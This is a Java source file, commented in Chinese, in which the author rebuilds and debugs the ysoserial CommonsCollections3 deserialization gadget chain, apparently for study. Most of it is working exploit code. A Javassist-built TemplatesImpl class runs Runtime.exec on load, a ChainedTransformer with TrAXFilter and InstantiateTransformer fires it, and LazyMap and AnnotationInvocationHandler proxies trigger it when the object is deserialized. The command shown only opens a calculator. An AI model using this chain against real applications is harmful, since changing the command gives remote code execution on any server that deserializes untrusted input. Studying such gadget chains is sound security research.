package com.example.apache_collections;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import javassist.*;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InstantiateTransformer;
import org.apache.commons.collections.map.LazyMap;
import org.apache.xalan.xsltc.trax.TemplatesImpl;
import org.apache.xalan.xsltc.trax.TrAXFilter;

import javax.xml.transform.Templates;
import java.io.*;
import java.lang.reflect.*;
import java.text.Annotation;
import java.util.HashMap;
import java.util.Map;

public class CommonCollectioms3 {

    public static class StubTransletPayload extends AbstractTranslet implements Serializable {

        private static final long serialVersionUID = -5971610431559700674L;


        public void transform(DOM document, SerializationHandler[] handlers) {
        }

        @Override
        public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) {
        }
    }

    public static class Foo implements Serializable {

        private static final long serialVersionUID = 8207363842866235160L;
    }

    public static void main(String[] args) throws ClassNotFoundException, IllegalAccessException, InstantiationException, CannotCompileException, IOException, NoSuchFieldException, NotFoundException, NoSuchMethodException, InvocationTargetException {
        System.out.println("CommonCollection3 refind");
        /*
        由CommonCollections3的开头，我们知道这里使用了 InstantiateTransformer 类
        Variation on CommonsCollections1 that uses InstantiateTransformer instead of
        * InvokerTransformer.
        去看一下这个类，
        [InvokerTransformer.java](https://github.com/apache/commons-collections/blob/collections-3.1/src/java/org/apache/commons/collections/functors/InstantiateTransformer.java)
         doc里描述了，该类是通过反射来创建一个对象
         Transformer implementation that creates a new object instance by reflection.
         首先是构造函数
         ```java
             public InstantiateTransformer(Class[] paramTypes, Object[] args) {
                super();
                iParamTypes = paramTypes;
                iArgs = args;
            }

         ```
         然后看过它的`transform`函数
         ```java
            Constructor con = ((Class) input).getConstructor(iParamTypes);
            return con.newInstance(iArgs);
         ```

         通过传入的类，构造一个实例化对象
         在CommonCollection2中， 了解到可以由Template来构造一个类， 可以达到构造时就执行命令的目的
         */


        Class tplClass =  Class.forName("org.apache.xalan.xsltc.trax.TemplatesImpl");
        Class abstTranslet = Class.forName("org.apache.xalan.xsltc.runtime.AbstractTranslet");
        Class transFactory = Class.forName("org.apache.xalan.xsltc.trax.TransformerFactoryImpl");
        Object template =  tplClass.newInstance();

        ClassPool pool = ClassPool.getDefault();
        pool.insertClassPath(new ClassClassPath(CommonCollections2.StubTransletPayload.class));
        pool.insertClassPath(new ClassClassPath(abstTranslet));

        final CtClass clazz = pool.get(CommonCollections2.StubTransletPayload.class.getName());

        String cmd = "java.lang.Runtime.getRuntime().exec(\"galculator\");";
        clazz.makeClassInitializer().insertAfter(cmd);
        clazz.setName("ysoserial.Pwner" + System.nanoTime());
        CtClass superC = pool.get(abstTranslet.getName());
        clazz.setSuperclass(superC);

        final byte[] classBytes = clazz.toBytecode();
        Field bytecodes = tplClass.getDeclaredField("_bytecodes");
        // 由于_bytecodes是private属性,需要 设置 Access = TRue
        bytecodes.setAccessible(true);
        // bytecodes 是 [][] 类型的,所以要加另外一个类,即上边的FOO
        // 我们把它的classfiles类拿过来用一下
        bytecodes.set(template, new byte[][]{classBytes, com.example.apache_collections.ClassFiles.classAsBytes(CommonCollections2.Foo.class)});

        Field name = tplClass.getDeclaredField("_name");
        name.setAccessible(true);
        name.set(template, "Pwnr");

        Field tfactory = tplClass.getDeclaredField("_tfactory");
        tfactory.setAccessible(true);
        tfactory.set(template, transFactory.newInstance());

        // 然后通过InstantiateTransformer 来执行一下命令,InstantiateTransformer, 但是看构造函数
        //只能通过类，来进行构造函数的创建， 并不能指定某一个templateImp执行命令， 需要找一个可反射这里
        // 直接执行以失败告终，  newTransformer/getOutputPropertie均可
        //InstantiateTransformer ins = new InstantiateTransformer(new Class[] {}, null);
        //Object obj = ins.transform(TemplatesImpl.class);


        //又看到ysoseraial给了 [trAXFilter.java](https://github.com/AdoptOpenJDK/openjdk-jdk11/blob/master/src/java.xml/share/classes/com/sun/org/apache/xalan/internal/xsltc/trax/TrAXFilter.java0)
        //它的构造函数就有这个函数
        /*
        ```java
            public TrAXFilter(Templates templates)  throws
                TransformerConfigurationException
            {
                _templates = templates;
                _transformer = (TransformerImpl) templates.newTransformer();
                _transformerHandler = new TransformerHandlerImpl(_transformer);
                _overrideDefaultParser = _transformer.overrideDefaultParser();
            }
        ```
        写出类来 可以执行命令
         */
//        InstantiateTransformer ins = new InstantiateTransformer(new Class[] {Templates.class}, new Object[] {template});
//        Object obj = ins.transform(TrAXFilter.class);

        /*
        然后就是和每一个一样了，通过lasymap就可以执行命令
        先用ChainedTransformer 构造一个

         */
        ChainedTransformer cts = new ChainedTransformer(new Transformer[] {
                new ConstantTransformer(TrAXFilter.class),
                new InstantiateTransformer(new Class[] {Templates.class}, new Object[] {template})
        });
//        cts.transform(1);
        //然后可以利用lazyMap
        // 发现报错了
        //Exception in thread "main" java.lang.UnsupportedOperationException: Serialization support for org.apache.commons.collections.functors.InstantiateTransformer is disabled for security reasons. To enable it set system property 'org.apache.commons.collections.enableUnsafeSerialization' to 'true', but you must ensure that your application does not de-serialize objects from untrusted sources.
        //	at org.apache.commons.collections.functors.FunctorUtils.checkUnsafeSerialization(FunctorUtils.java:183)
        //	at org.apache.commons.collections.functors.InstantiateTransformer.writeObject(InstantiateTransformer.java:137)
        //	at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
        //	at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62)
        //	at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
        //	at java.lang.reflect.Method.invoke(Method.java:498)
        //  看记录发现pom.xml 引入了3.2.2 而不是3.1版本
        HashMap map = new HashMap();
        LazyMap lazyMap = (LazyMap) LazyMap.decorate(map, cts);
//        lazyMap.put("1", "2");
        // 通过lasyMap.get() 发现可以触发，但是直接反序列化是不可以 的
//        lazyMap.get(1);

        // 直接反序列化是不可以的， 这时我们想起来在commonCollection1时，利用了Annotatiom来反序列化，
        // map类传入是 memberValues，而在invoke函数中调用了 memValue.get()
        // 所以需要在readOjbect()时，调用invoke函数
        /*
        而annotationHandler说，
        // If there are annotation members without values, that
        // situation is handled by the invoke method.
        // 然后最后报错返回了  java.lang.Override missing element entrySet， 只要使用低版本就可以了

        // http://www.thegreycorner.com/2016/05/commoncollections-deserialization.html
         */


        String class_name = "sun.reflect.annotation.AnnotationInvocationHandler";
        Class clazz1 = Class.forName(class_name);
        // 因为没有public的构造函数，需要用反射来处理
        Constructor ctr = clazz1.getDeclaredConstructor(Class.class, Map.class);
        ctr.setAccessible(true);
        // 这里为什么要用Override.class, 是因为在AnnotationInvocationHandler类中， 要检查var1是否为isAnnotation
        // 在这里还涉及到了委派模式。。https://blog.csdn.net/ibukikonoha/article/details/80698610
        Object obj = ctr.newInstance(Override.class, lazyMap);
        // 仍然如同CommonCollection1, 设置一个动态代理类,
        // 至此 CommonCollection3 调试完毕

        /*
        * 再详细解释一下， 现在的目标是想调用AnnotationInvocatiomHandler中的invoke函数，
        * invoke函数会调用memberValues.get()函数
        * memberValue的值是一个LazyMap函数， 其get方法会调用 `this.factory.transform(key);` 即通过`decorate`中的`Transformer`
        * 而`Transformer。tranceform` 会调用 `TrAXFilter` 和 `Template`，达到反序列化的目的。
        *ers for an annotation method");
        } else {
        * */
        Map proxy_ctr_obj = (Map) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), new Class[]{Map.class}, (InvocationHandler) obj);
        InvocationHandler ctr_obj2 = (InvocationHandler)ctr.newInstance(Override.class, proxy_ctr_obj);
//        proxy_ctr_obj.toString();
        Map proxy_ctr_obj2 = (Map) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), new Class[]{Map.class}, (InvocationHandler) ctr_obj2);
//        proxy_ctr_obj2.toString();
//        proxy_ctr_obj2.entrySet();
//        ctr_obj2.invoke(proxy_ctr_obj, "get", "1");
//        proxy_ctr_obj.get("1");
//        proxy_ctr_obj.getOrDefault("1", "2");
        // 这里在调用debug的时候，触发了，但是直接run没有触发， 奇怪了。
        // 原因是：
        byte[] b = do_serialize(proxy_ctr_obj2);
        Object a = do_unserialize(b);
        
        /*
        Exception in thread "main" org.apache.commons.collections.FunctorException: InstantiateTransformer: Constructor threw an exception
        at org.apache.commons.collections.functors.InstantiateTransformer.transform(InstantiateTransformer.java:114)
        at org.apache.commons.collections.functors.ChainedTransformer.transform(ChainedTransformer.java:122)
        at org.apache.commons.collections.map.LazyMap.get(LazyMap.java:151)
        at sun.reflect.annotation.AnnotationInvocationHandler.invoke(AnnotationInvocationHandler.java:77)
        at com.sun.proxy.$Proxy0.entrySet(Unknown Source)
        at sun.reflect.annotation.AnnotationInvocationHandler.readObject(AnnotationInvocationHandler.java:443)
        at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
        at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:57)
        at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
        at java.lang.reflect.Method.invoke(Method.java:606)
        at java.io.ObjectStreamClass.invokeReadObject(ObjectStreamClass.java:1017)
        at java.io.ObjectInputStream.readSerialData(ObjectInputStream.java:1893)
        at java.io.ObjectInputStream.readOrdinaryObject(ObjectInputStream.java:1798)
        at java.io.ObjectInputStream.readObject0(ObjectInputStream.java:1350)
        at java.io.ObjectInputStream.readObject(ObjectInputStream.java:370)
        at com.example.apache_collections.CommonCollectioms3.do_unserialize(CommonCollectioms3.java:217)
        at com.example.apache_collections.CommonCollectioms3.main(CommonCollectioms3.java:198)
    Caused by: java.lang.reflect.InvocationTargetException
        at sun.reflect.NativeConstructorAccessorImpl.newInstance0(Native Method)
        at sun.reflect.NativeConstructorAccessorImpl.newInstance(NativeConstructorAccessorImpl.java:57)
        at sun.reflect.DelegatingConstructorAccessorImpl.newInstance(DelegatingConstructorAccessorImpl.java:45)
        at java.lang.reflect.Constructor.newInstance(Constructor.java:526)
        at org.apache.commons.collections.functors.InstantiateTransformer.transform(InstantiateTransformer.java:105)
        ... 16 more
    Caused by: java.lang.NullPointerException
        at org.apache.xalan.xsltc.runtime.AbstractTranslet.postInitialization(AbstractTranslet.java:366)
        at org.apache.xalan.xsltc.trax.TemplatesImpl.getTransletInstance(TemplatesImpl.java:341)
        at org.apache.xalan.xsltc.trax.TemplatesImpl.newTransformer(TemplatesImpl.java:369)
        at org.apache.xalan.xsltc.trax.TrAXFilter.<init>(TrAXFilter.java:61)
        ... 21 more
             */

        return;
    }

    public static byte[]  do_serialize(Object obj) throws IOException {
        ByteArrayOutputStream btout = new ByteArrayOutputStream();

        ObjectOutputStream oos = new ObjectOutputStream(btout);
        oos.writeObject(obj);
        System.out.println("do serialized success");
        return btout.toByteArray();
    }

    public static Object do_unserialize(byte[] data) throws IOException, ClassNotFoundException {
        ByteArrayInputStream btin = new ByteArrayInputStream(data);
        ObjectInputStream ooi = new ObjectInputStream(btin);

        System.out.println("do unserialized success");
        return ooi.readObject();
    }
}
